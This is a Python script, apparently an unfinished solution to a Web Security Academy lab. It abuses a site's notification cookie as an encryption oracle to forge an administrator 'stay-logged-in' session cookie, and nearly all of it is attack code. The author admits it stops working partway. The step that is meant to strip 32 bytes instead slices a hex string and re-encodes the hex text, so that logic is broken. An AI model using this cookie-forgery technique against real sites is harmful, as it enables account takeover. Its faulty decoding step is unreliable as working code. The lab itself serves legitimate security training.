#######################################################################
### From a certain point onwards, the script will not work anymore. ###
#######################################################################

from lxml import html
import requests
from rich.console import Console
from base64 import b64encode, b64decode
from urllib.parse import quote, unquote

SERVER = "https://0abf00d7039d62038756497d006700ca.web-security-academy.net"

session = requests.Session()
console = Console()
comment_page_csrf_token = None

def get_csrf_token(endpoint):
    page = session.get(f"{SERVER}/{endpoint}")
    csrf_token = html.fromstring(page.content).xpath('//input[@name="csrf"]/@value')[0]
    return csrf_token

def do_login(username, password):
    csrf_token = get_csrf_token("login")
    response = session.post(f"{SERVER}/login", data={"csrf":csrf_token, "username":username, "password":password, "stay-logged-in":"on"})
    return response

def write_comment(postId, comment, name, email):
    global comment_page_csrf_token
    if not comment_page_csrf_token:
        comment_page_csrf_token = get_csrf_token(f"post?postId={postId}")
    response = session.post(f"{SERVER}/post/comment", data={"csrf":comment_page_csrf_token, "postId": postId, "comment": comment, "name": name, "email": email})
    return response

with console.status("Logging in"):
    console.log(f'Login status: {do_login("wiener", "peter").status_code}')

notification_cookie = None
stay_logged_in_cookie = session.cookies.get_dict()["stay-logged-in"]

# We write this comment to get the notification cookie
with console.status("Writing comment with wrong email address"):
    console.log(f"First comment status: {write_comment(postId=1, comment="I hate this", name="who cares", email="not-an-email").status_code}")
    notification_cookie = session.cookies.get_dict()["notification"]
    console.log(f"Notification cookie: {notification_cookie}")

with console.status("Replacing notification cookie with stay-logged-in cookie"):
    session.cookies.set("notification", stay_logged_in_cookie)

notification_header = None
with console.status("Writing comment with stay-logged-in cookie in email field"):
    response = write_comment(postId=1, comment="I hate also this", name="nobody does", email="another-non-existent-email")
    console.log(f"Second comment status: {response.status_code}")
    
with console.status("Retrieving the timestamp"):
    notification_header = html.fromstring(response.content).xpath('//header[@class="notification-header"]/text()')[0]
    # We get in output something like "\n       wiener:<timestamp>      "
    timestamp = notification_header.strip().split(":")[-1]
    console.log(f"Timestamp: {timestamp}")

forged_plain_cookie = f"administrator:{timestamp}"
# "A bird" told us that text is encrypted iff it has len multiple of 16
while len(forged_plain_cookie) % 16 != 0:
    forged_plain_cookie = "x" + forged_plain_cookie
console.log(f"Forged plain cookie: {forged_plain_cookie}")

with console.status("Writing comment to get encrypted cookie"):
    response = write_comment(postId=1, comment="Ok please stop", name="lalalaaa", email=forged_plain_cookie)
    console.log(f"Third comment status: {response.status_code}")
    notification_cookie = session.cookies.get_dict()["notification"]

console.log(f"Encrypted cookie: {notification_cookie}")
# Another bird told us that we need to remove the first 32 bytes
# Before that we need to go though this process
# URL decode -> base64 decode -> remove first 32 bytes -> base64 encode -> URL encode
forged_cookie = quote(b64encode(b64decode(unquote(notification_cookie)).hex()[32:].encode()))

with console.status("Replacing notification cookie with forged cookie"):
    session.cookies.set("notification", forged_cookie)
    response = write_comment(postId=1, comment="PLEASE", name="AAAAAAAA", email="bad-email")
    console.log(f"Fourth comment status: {response.status_code}")
    notification_header = html.fromstring(response.content).xpath('//header[@class="notification-header"]/text()')[0]
    console.log(f"Notification header: {notification_header}")

### I HATE THIS LAB WHY DID I DECIDE TO DO IT ###
### I WILL STOP HERE ###
